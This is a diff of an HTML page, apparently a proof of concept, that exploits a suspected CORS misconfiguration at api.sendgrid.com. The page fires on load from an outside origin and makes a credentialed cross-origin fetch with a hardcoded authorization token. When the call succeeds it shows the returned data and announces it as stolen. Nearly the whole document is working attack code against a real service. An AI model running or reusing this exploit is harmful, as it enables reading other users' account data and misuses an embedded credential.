@@ -2,62 +2,69 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Exploit: SendGrid CORS Misconfiguration</title>
+    <title>PoC: SendGrid CORS Vulnerability</title>
     <style>
-        body { font-family: 'Courier New', Courier, monospace; background-color: #0d1117; color: #58a6ff; padding: 50px; }
-        .console { background-color: #161b22; border: 1px solid #30363d; padding: 20px; border-radius: 6px; box-shadow: 0 4px 20px rgba(0,0,0,0.5); }
-        h1 { color: #f85149; font-size: 1.5rem; }
-        .loading { color: #d29922; }
-        .success { color: #3fb950; font-weight: bold; }
-        #data-output { color: #c9d1d9; word-wrap: break-word; white-space: pre-wrap; margin-top: 15px; border-top: 1px solid #30363d; padding-top: 10px; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f0f2f5; color: #1c1e21; padding: 40px; text-align: center; }
+        .box { background: white; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); padding: 20px; max-width: 700px; margin: auto; border-top: 5px solid #ff4757; }
+        h2 { color: #ff4757; }
+        pre { background: #2f3542; color: #ffffff; padding: 15px; border-radius: 5px; text-align: left; overflow-x: auto; font-size: 13px; }
+        .status { font-weight: bold; margin: 15px 0; padding: 10px; border-radius: 5px; }
+        .success { background: #e3f9e5; color: #1f8b24; }
+        .error { background: #ffe3e3; color: #bf2121; }
     </style>
 </head>
 <body>
 
-<div class="console">
-    <h1>[!] CORS Exploit Initialized</h1>
+<div class="box">
+    <h2>Exploit Proof-of-Concept</h2>
     <p>Target: <code>api.sendgrid.com/v3/stats</code></p>
-    <div id="status" class="loading">[*] Waiting for execution...</div>
-    <div id="data-output"></div>
+    <p>Source Origin: <code>https://stelemane.github.io</code></p>
+    
+    <div id="status" class="status">[*] Initializing Request...</div>
+    <pre id="output">Waiting for data...</pre>
 </div>
 
 <script>
     window.onload = function() {
-        const status = document.getElementById('status');
-        const output = document.getElementById('data-output');
+        const statusDiv = document.getElementById('status');
+        const outputDiv = document.getElementById('output');
         
-        const targetUrl = "https://api.sendgrid.com/v3/stats?aggregated_by=week&start_date=2023-05-27";
+        const target = "https://api.sendgrid.com/v3/stats?aggregated_by=week&start_date=2023-05-27";
 
-        status.innerHTML = "[*] Sending cross-origin request with credentials...";
+        statusDiv.innerText = "[*] Sending request with Authorization & Credentials...";
 
-        fetch(targetUrl, {
+        fetch(target, {
             method: "GET",
             mode: "cors",
             credentials: "include",
             headers: {
                 "Accept": "application/json",
-                "Content-Type": "application/json",
                 "Authorization": "token B2AB7UQHM7QSAIWJ.7TXCADQD6DKRRJNIQNP5INSG56GNZAYCLB6J5G4ZLC6HXKJZRCZRFITVIQ6YBYD7JZML5NHOZX75WHGTSKCEH4QV"
             }
         })
         .then(response => {
             if (response.ok) {
-                status.innerHTML = "<span class='success'>[+] VULNERABILITY CONFIRMED! Data extracted.</span>";
+                statusDiv.innerText = "[+] SUCCESS: Data Extracted Successfully!";
+                statusDiv.className = "status success";
                 return response.json();
             } else {
-                status.innerHTML = "<span style='color:#f85149;'>[-] Failed. Status: " + response.status + " (The server might have blocked the Origin)</span>";
-                throw new Error("Response not OK");
+                statusDiv.innerText = "[-] FAILED: Server returned status " + response.status;
+                statusDiv.className = "status error";
+                return response.text();
             }
         })
         .then(data => {
-            output.innerText = JSON.stringify(data, null, 2);
-            alert("SUCCESS! Data stolen from SendGrid:\n" + JSON.stringify(data).substring(0, 300));
-        })
-        .catch(error => {
-            console.error("CORS Error:", error);
-            if (status.innerHTML.indexOf("Failed") === -1) {
-                status.innerHTML = "<span style='color:#f85149;'>[-] CORS Policy Blocked the reading of the response.</span>";
+            outputDiv.innerText = typeof data === 'object' ? JSON.stringify(data, null, 2) : data;
+            
+            if (typeof data === 'object') {
+                alert("Vulnerability Confirmed!\nData stolen from api.sendgrid.com");
             }
+        })
+        .catch(err => {
+            statusDiv.innerText = "[-] ERROR: CORS Policy blocked the access.";
+            statusDiv.className = "status error";
+            outputDiv.innerText = err.toString() + "\n\nNote: This means the server did not reflect the Origin: https://stelemane.github.io";
+            console.error(err);
         });
     };
 </script>
